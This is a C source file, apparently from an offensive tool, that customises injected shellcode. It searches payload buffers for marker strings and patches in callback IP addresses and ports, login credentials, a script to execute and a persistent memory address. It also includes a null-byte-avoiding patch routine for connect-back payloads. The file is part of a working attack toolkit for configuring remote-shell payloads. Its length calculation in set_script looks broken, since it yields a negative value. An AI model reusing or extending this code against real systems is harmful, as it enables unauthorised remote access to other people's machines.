/*
 * Shellcode personalization
 */

// print error message, if a mark is not found
void mark_not_found(const char *type)
{
    printf("[!] ERROR: %s mark not found. Check your payload\n", type);
    //exit(-1);
}

// search the mark in the shellcode
// return:
// NULL    (failure)
// pointer (success)
char *mark_search(char *shellcode, int slen, const char *mark)
{
    int mlen = strlen(mark);
    int i=0;

    for (i=0; i<(slen-mlen)+1; i++) {
        if(!strncmp(&shellcode[i], mark, mlen)) {
            return &shellcode[i];
        }
    }

    return NULL;
}

// persistent memory address
void set_persistent(char *shellcode, int slen, uint32_t pmem)
{
    char *ptr = NULL;

    if(!(ptr = mark_search(shellcode, slen, persistent_mark))) mark_not_found("persistent memory");

    *(uint32_t*)ptr = pmem;
}

// set 32 bit integer
void set_32bit(char *shellcode, int slen, uint32_t intg, const char *mark, const char *mark_name)
{
    char *ptr = NULL;

    if(!(ptr = mark_search(shellcode, slen, mark))) mark_not_found(mark_name);

    *(uint32_t*)ptr = intg;
}

// set 16 bit integer
void set_16bit(char *shellcode, int slen, uint16_t intg, const char *mark, const char *mark_name)
{
    char *ptr = NULL;

    if(!(ptr = mark_search(shellcode, slen, mark))) mark_not_found(mark_name);

    *(uint16_t*)ptr = intg;
}

// username = 4 chars
void set_username(char *shellcode, int slen, char *username)
{
    char *ptr = NULL;

    char name[4];
    int name_len = strlen(username);

    memset(name, 0, sizeof(name));

    if(!(ptr = mark_search(shellcode, slen, username_mark))) mark_not_found("username");

    strncpy(name, username, (name_len < sizeof(name)) ? name_len : sizeof(name));
    strncpy(ptr, name, sizeof(name));
}

// password = 8 chars
void set_password(char *shellcode, int slen, char *password)
{
    char *ptr1 = NULL, *ptr2 = NULL;

    char pass[8];
    int pass_len = strlen(password);

    memset(pass, 0, sizeof(pass));

    ptr1 = mark_search(shellcode, slen, password_mark);
    ptr2 = mark_search(ptr1+sizeof(pass), slen, password_mark);
    if(!ptr1 || !ptr2) mark_not_found("password");

    strncpy(pass, password, (pass_len < sizeof(pass)) ? pass_len : sizeof(pass));

    strncpy(ptr1, pass + 4, 4);
    strncpy(ptr2, pass, 4);
}

// script code
void set_script(char *shellcode, int slen, const char *script)
{
    char *ptr = NULL;
    int script_len;

    if(!(ptr = mark_search(shellcode, slen, script_mark))) mark_not_found("script");

    script_len = strlen(script);

    strncpy(ptr, script, script_len);
    *(ptr + script_len) = '\0';

    payload_len = (shellcode - (ptr + script_len)); // adjust shellcode length
}

// Russell Sanford - xort@tty64.org
int find_safe_offset(int INT_A) {

    int INT_B=0;
    do {
        INT_A -= 0x01010101;    INT_B += 0x01010101;
    }
    while ( ((INT_A & 0x000000ff) == 0) ||
            ((INT_A & 0x0000ff00) == 0) ||
            ((INT_A & 0x00ff0000) == 0) ||
            ((INT_A & 0xff000000) == 0) );

    return INT_B;
}

// Russell Sanford - xort@tty64.org
void patchcode(char *shellcode, uint16_t PORT_IN, uint32_t IP, uint16_t PORT_OUT) {

    uint16_t PORT_IN_A = PORT_IN;
    uint16_t PORT_IN_B = find_safe_offset(PORT_IN_A);

    int IP_A = IP;
    int IP_B = find_safe_offset(IP_A);

    int PORT_OUT_A = PORT_OUT;
    int PORT_OUT_B = find_safe_offset(PORT_OUT_A);

    *(int *)&shellcode[134] = (PORT_IN_A - PORT_IN_B);
    *(int *)&shellcode[141] = PORT_IN_B;

    *(int *)&shellcode[205] = (IP_A - IP_B);
    *(int *)&shellcode[212] = IP_B;

    *(int *)&shellcode[217] = (PORT_OUT_A - PORT_OUT_B);
    *(int *)&shellcode[224] = PORT_OUT_B;

}

// main function
void personalize_shellcode(void)
{
    //printf("[DBG] Payload before personalization:\n%s\n", sh_buffer);

    /*if(args.payload_index == 4) {
        patchcode(sh_buffer, args.my_port, args.my_ip, args.my_port2);
    }*/

    if(args.timer_sec) set_32bit(sh_buffer, payload_len, args.timer_sec, seconds_mark, "seconds");
    if(args.timer_micro) set_32bit(sh_buffer, payload_len, args.timer_micro, microsec_mark, "microseconds");

    if(use_setitimer) {
        if(args.timer_sec) set_32bit(sh_buffer, payload_len, args.timer_sec, seconds_mark, "seconds");
        if(args.timer_micro) set_32bit(sh_buffer, payload_len, args.timer_micro, microsec_mark, "microseconds");
    }

    if(args.my_ip) set_32bit(sh_buffer, payload_len, args.my_ip, ip_mark, "IP");
    if(args.my_port) set_16bit(sh_buffer, payload_len, args.my_port, port_mark, "port");
    if(args.my_port2) set_16bit(sh_buffer, payload_len, args.my_port2, port_mark, "port2");

    if(args.my_username) set_username(sh_buffer, payload_len, args.my_username);
    if(args.my_password) set_password(sh_buffer, payload_len, args.my_password);

    if(args.my_script) set_script(sh_buffer, payload_len, args.my_script);

    if(need_persistent) set_persistent(sh_buffer, payload_len, persistent_addr);

    //printf("[DBG] Payload after personalization:\n%s\n", sh_buffer);
}
